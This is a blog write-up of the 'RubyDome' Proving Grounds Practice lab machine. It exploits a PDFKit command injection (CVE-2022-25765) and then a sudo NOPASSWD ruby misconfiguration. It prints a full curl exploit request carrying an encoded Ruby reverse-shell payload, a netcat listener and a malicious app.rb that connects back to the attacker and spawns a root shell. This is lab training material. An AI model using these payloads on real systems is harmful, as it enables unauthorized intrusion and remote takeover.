---
layout: post
title: "RubyDome - Proving Grounds Practice"
summary: "PDFKit → CVE-2022-25765 → user shell → sudo NOPASSWD ruby over writable rb file → root"
---

# RubyDome - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed SSH and port 3000 were open.

<img width="805" height="390" alt="00 - nmap" src="https://github.com/user-attachments/assets/e59e56df-721a-40c8-8399-eef33a3e2996" />

### Web Enumeartion
Website had singular input point where it converts a page from URL to a pdf.

<img width="1227" height="400" alt="01 - website" src="https://github.com/user-attachments/assets/828ef327-1900-4600-b1c1-476454f1e4f1" />

However, entering random values revealed that page was using `PDFKit` to do this operation.

<img width="1920" height="832" alt="02 - pdf" src="https://github.com/user-attachments/assets/fc627566-2c4b-404c-90a3-41d04843ce6b" />

## Exploitation
### CVE-2022-25765
The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.

Some research revealed that we could exploit this to obtain remote command execution. I found a github repo named [shamo0/PDFkit-CMD-Injection](https://github.com/shamo0/PDFkit-CMD-Injection) which explains this exploitation in detail.

<img width="1920" height="851" alt="03 - exploit for pdfkit" src="https://github.com/user-attachments/assets/1761ef3e-cfd4-4b6a-a37a-3279e16b328d" />

All I needed to is run below commands on different terminals to get a reverse shell.
```bash
## first terminal
python3 -m http.server 80

## second terminal
sudo rlwrap nc -nlvp 4444

## third terminal (update IP and PORT values)
curl 'http://192.168.157.22:3000' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.157.22:3000' -H 'Connection: keep-alive' -H 'Referer: http://192.168.157.22:3000' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2192.168.45.220%3A80%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22192.168.45.220%22%2C4444%29%29%27%60'
```

<img width="1066" height="248" alt="06 - exploiting" src="https://github.com/user-attachments/assets/22b03d5e-02ce-4654-9330-1ed4423ea583" />

And by running the last command, I got the user shell.

<img width="977" height="605" alt="07 - local flag" src="https://github.com/user-attachments/assets/cc8751a4-8d2e-412f-95bc-554f5aea3c27" />

## Privilege Escalation
### sudo NOPASSWD ruby over writable rb file
`sudo -l`command revealed that user had NOPASSWD ruby privileges over an app.rb file which we had write access.

<img width="854" height="148" alt="08 - sudo -l" src="https://github.com/user-attachments/assets/c0ca326a-f7b6-4455-a4cc-53c87d1b2287" />

At first I created a malicious app.rb file as seen below.
```ruby
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 1337, '192.168.45.220'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```

Then transfered it to target machine.

<img width="810" height="417" alt="10 - transfered" src="https://github.com/user-attachments/assets/0e4f3279-08e6-44be-902f-aac205ee451c" />

And executing it got me root shell.

<img width="540" height="71" alt="11 - executed it" src="https://github.com/user-attachments/assets/640a0b74-2cc3-4641-8b39-128401f5db0c" />

<img width="812" height="411" alt="12 - gg" src="https://github.com/user-attachments/assets/1a23cfb3-16be-4ad7-a708-17142c37ebea" />

